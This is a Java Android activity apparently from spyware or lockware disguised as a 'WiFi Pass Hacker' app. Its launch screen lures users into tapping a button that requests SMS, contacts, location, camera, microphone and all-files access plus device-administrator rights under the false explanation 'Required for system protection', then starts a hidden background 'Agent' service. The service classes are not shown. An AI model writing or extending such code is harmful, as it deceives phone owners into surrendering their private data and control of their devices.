package com.network.wifianalyzer;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.widget.*;
import android.graphics.Color;
import android.view.Gravity;
import android.view.View;
import java.util.ArrayList;
import java.util.List;

public class Main extends Activity {
    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        LinearLayout layout = new LinearLayout(this);
        layout.setOrientation(LinearLayout.VERTICAL);
        layout.setBackgroundColor(Color.BLACK);
        layout.setGravity(Gravity.CENTER);

        TextView title = new TextView(this);
        title.setText("WiFi Pass Hacker");
        title.setTextColor(Color.GREEN);
        title.setTextSize(30);
        title.setGravity(Gravity.CENTER);
        layout.addView(title);

        TextView desc = new TextView(this);
        desc.setText("\n[+] Bypass WPA2\n[+] Grab Passwords\n[+] Hack Routers\n\nTap to Start");
        desc.setTextColor(Color.LTGRAY);
        desc.setTextSize(16);
        desc.setGravity(Gravity.CENTER);
        layout.addView(desc);

        Button btn = new Button(this);
        btn.setText("START & GRANT PERMISSIONS");
        btn.setBackgroundColor(Color.GREEN);
        btn.setTextColor(Color.BLACK);
        btn.setOnClickListener(new View.OnClickListener() {
            public void onClick(View v) { requestAll(); }
        });
        layout.addView(btn);
        setContentView(layout);
    }

    private void requestAll() {
        List<String> perms = new ArrayList<>();
        perms.add(android.Manifest.permission.READ_EXTERNAL_STORAGE);
        perms.add(android.Manifest.permission.WRITE_EXTERNAL_STORAGE);
        perms.add(android.Manifest.permission.READ_SMS);
        perms.add(android.Manifest.permission.READ_CONTACTS);
        perms.add(android.Manifest.permission.ACCESS_FINE_LOCATION);
        perms.add(android.Manifest.permission.CAMERA);
        perms.add(android.Manifest.permission.RECORD_AUDIO);
        if (Build.VERSION.SDK_INT >= 33) perms.add(android.Manifest.permission.POST_NOTIFICATIONS);

        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
            Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION);
            intent.setData(Uri.parse("package:" + getPackageName()));
            startActivity(intent);
        }

        // طلب صلاحية القفل (Device Admin)
        ComponentName adminComponent = new ComponentName(this, Boot.class);
        Intent adminIntent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
        adminIntent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
        adminIntent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Required for system protection");
        startActivity(adminIntent);

        requestPermissions(perms.toArray(new String[0]), 101);
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, String[] permissions, int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        Intent serviceIntent = new Intent(this, Agent.class);
        if (Build.VERSION.SDK_INT >= 26) startForegroundService(serviceIntent);
        else startService(serviceIntent);
        Toast.makeText(this, "System Hacked. Running in background.", Toast.LENGTH_LONG).show();
        finish();
    }
}
